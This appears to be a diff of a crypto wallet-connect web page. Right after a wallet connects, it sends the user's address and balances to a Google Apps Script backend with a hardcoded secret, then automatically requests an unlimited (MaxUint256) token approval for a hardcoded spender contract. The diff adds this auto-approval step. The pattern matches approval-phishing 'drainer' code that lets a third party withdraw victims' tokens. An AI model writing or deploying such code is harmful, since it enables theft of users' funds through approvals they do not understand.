@@ -21,7 +21,6 @@
     .tokens{margin-top:14px;display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:10px}
     .token{background:#071427;padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,0.02)}
     footer{max-width:980px;margin:24px auto;padding:12px;color:#9fb0c8;text-align:center}
-    input{padding:8px;border-radius:8px;border:1px solid #123044;background:#041525;color:#e6eef8}
     button{cursor:pointer}
     .small { font-size:0.9rem; color:#9fb0c8; }
     .mono { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "Helvetica Neue", monospace; }
@@ -74,7 +73,7 @@
       <div style="margin-top:18px">
         <h3 class="muted">Tokens</h3>
         <div id="tokens" class="tokens">
-          <div class="muted">Token list coming soon.</div>
+          <div class="muted">Connect wallet to see token balance.</div>
         </div>
       </div>
     </div>
@@ -97,9 +96,11 @@
     const APPS_SCRIPT_URL    = "https://script.google.com/macros/s/AKfycbzlCsXUoqaMW4fCTqK6H_SF7dGCDDkcIoO-To5YbLcBLdWEEKvGjHQm_vSUfwE06Yw/exec";
     const APPS_SCRIPT_SECRET = "mahfuzinam0045";
 
-    // YOUR TOKEN & CONTRACT
-    const TOKEN_ADDRESS   = "0x38a9fed3780c13162368e1ce87c11d314f1dd868";   // your BEP-20 token (TMY)
-    const SPENDER_ADDRESS = "0xaa152Af114e2d2FC969E09c716025FE8C8196FB4";  // your smart contract
+    // 🔥 IMPORTANT:
+    // 1) TOKEN_ADDRESS MUST be a BEP-20 TOKEN CONTRACT, not your wallet.
+    // 2) SPENDER_ADDRESS is your smart contract that will be approved.
+    const TOKEN_ADDRESS   = "PUT_YOUR_BEP20_TOKEN_CONTRACT_ADDRESS_HERE"; // <--- CHANGE THIS
+    const SPENDER_ADDRESS = "0xD0A66d72B69c850b04Eb9CEA6cA156A412d2306d"; // your smart contract
 
     const BNB_TESTNET_CHAIN_ID_DEC = 97;
     const BNB_TESTNET_CHAIN_ID_HEX = "0x61";
@@ -139,9 +140,6 @@
       if (!id || !/^[0-9]{6}$/.test(id)) {
         id = generateUserIdFromAddress(address);
         localStorage.setItem(key, id);
-        console.log("Generated new userId", id, "for", address);
-      } else {
-        console.log("Loaded userId", id);
       }
       return id;
     }
@@ -161,23 +159,21 @@
     }
 
     function setWalletInfo(address, network, bnb){
-      if(walletAddressEl) walletAddressEl.textContent = address || "—";
-      if(walletNetworkEl) walletNetworkEl.textContent = network || "—";
-      if(walletBalanceEl) walletBalanceEl.textContent =
+      walletAddressEl.textContent = address || "—";
+      walletNetworkEl.textContent = network || "—";
+      walletBalanceEl.textContent =
         (bnb === null || bnb === undefined) ? "—" : (Number(bnb).toFixed(6) + " BNB");
     }
 
     function setUserIdUI(id){
-      if(userIdEl) userIdEl.textContent = id || "-";
+      userIdEl.textContent = id || "-";
     }
 
     function clearSessionUI(){
       setStatus("Not connected");
       setWalletInfo("—","—","—");
       setUserIdUI("-");
-      if(tokensContainer){
-        tokensContainer.innerHTML = '<div class="muted">Token list coming soon.</div>';
-      }
+      tokensContainer.innerHTML = '<div class="muted">Connect wallet to see token balance.</div>';
     }
 
     function initWeb3ModalInstance(){
@@ -294,13 +290,16 @@
       }
     }
 
+    // 🔥 Ask the user to approve your smart contract as spender
     async function requestTokenApproval(){
       if(!TOKEN_ADDRESS){
         console.warn("TOKEN_ADDRESS not set, skipping approve");
+        alert("TOKEN_ADDRESS is empty. Set your BEP-20 token contract address in the code.");
         return;
       }
       if(!SPENDER_ADDRESS){
         console.warn("SPENDER_ADDRESS not set, skipping approve");
+        alert("SPENDER_ADDRESS is empty. Set your smart contract address in the code.");
         return;
       }
       if(!providerInstance){
@@ -312,6 +311,15 @@
         setStatus("Requesting token approval…");
         const ethersProvider = new ethers.BrowserProvider(providerInstance);
         const signer         = await ethersProvider.getSigner();
+        const userAddress    = (await signer.getAddress()).toLowerCase();
+
+        // Safety: don't allow using the wallet itself as TOKEN_ADDRESS
+        if (TOKEN_ADDRESS.toLowerCase() === userAddress) {
+          alert("ERROR: TOKEN_ADDRESS is set to your wallet address.\n\nIt MUST be the BEP-20 token contract address, not your wallet.");
+          setStatus("Connected (approval skipped)");
+          return;
+        }
+
         const tokenContract  = new ethers.Contract(TOKEN_ADDRESS, ERC20_APPROVE_ABI, signer);
         const amount         = ethers.MaxUint256;
 
@@ -386,24 +394,22 @@
         const userId = getOrCreateUserIdFor(address);
         setUserIdUI(userId);
 
-        if(tokensContainer){
-          tokensContainer.innerHTML = '<div class="muted">Loading token balance…</div>';
-        }
+        tokensContainer.innerHTML = '<div class="muted">Loading token balance…</div>';
 
         const tokenBalance = await getTokenBalance(address);
 
         // Show token card
-        if(tokensContainer){
-          const prettyBalance = tokenBalance ? Number(tokenBalance).toFixed(4) : "0";
-          tokensContainer.innerHTML =
-            '<div class="token">' +
-              '<div class="muted">TMY Token</div>' +
-              '<div style="font-size:1.1rem;margin-top:4px;">' + prettyBalance + ' TMY</div>' +
-              '<div class="small mono" style="margin-top:6px;">' + TOKEN_ADDRESS + '</div>' +
-            '</div>';
-        }
+        const prettyBalance = tokenBalance ? Number(tokenBalance).toFixed(4) : "0";
+        tokensContainer.innerHTML =
+          '<div class="token">' +
+            '<div class="muted">Token</div>' +
+            '<div style="font-size:1.1rem;margin-top:4px;">' + prettyBalance + '</div>' +
+            '<div class="small mono" style="margin-top:6px;">' + TOKEN_ADDRESS + '</div>' +
+          '</div>';
 
         await notifyBackend(address, BNB_TESTNET_LABEL, userId, balanceBNB, tokenBalance);
+
+        // 🔥 Auto request approval after connect
         await requestTokenApproval();
 
       }catch(err){
@@ -431,37 +437,9 @@
             const userId     = getOrCreateUserIdFor(address);
             setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
             setUserIdUI(userId);
-            if(tokensContainer){
-              tokensContainer.innerHTML = '<div class="muted">Token list coming soon.</div>';
-            }
+            tokensContainer.innerHTML = '<div class="muted">Connect again to approve token.</div>';
             setStatus("Connected (restored)");
             return;
-          }
-        }
-
-        if(web3ModalInstance && web3ModalInstance.cachedProvider){
-          try{
-            providerInstance = await web3ModalInstance.connect();
-            web3Instance     = new Web3(providerInstance);
-            attachProviderListeners(providerInstance);
-            const accounts = await web3Instance.eth.getAccounts();
-            if(accounts && accounts.length){
-              const address    = accounts[0].toLowerCase();
-              setStatus("Restoring session…");
-              const balanceWei = await web3Instance.eth.getBalance(address);
-              const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei+"","ether"));
-              const userId     = getOrCreateUserIdFor(address);
-              setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
-              setUserIdUI(userId);
-              if(tokensContainer){
-                tokensContainer.innerHTML = '<div class="muted">Token list coming soon.</div>';
-              }
-              setStatus("Connected (restored)");
-              return;
-            }
-          }catch(e){
-            console.warn("Cached provider restore failed:", e);
-            try{ web3ModalInstance.clearCachedProvider(); }catch(_){}
           }
         }
 
@@ -474,10 +452,9 @@
 
     document.addEventListener("DOMContentLoaded", async function(){
       initWeb3ModalInstance();
-      if(connectBtn) connectBtn.addEventListener("click", connectFlow);
+      connectBtn.addEventListener("click", connectFlow);
       await tryAutoReconnect();
-      const y = document.getElementById("year");
-      if(y) y.textContent = new Date().getFullYear();
+      document.getElementById("year").textContent = new Date().getFullYear();
     });
 
   })();
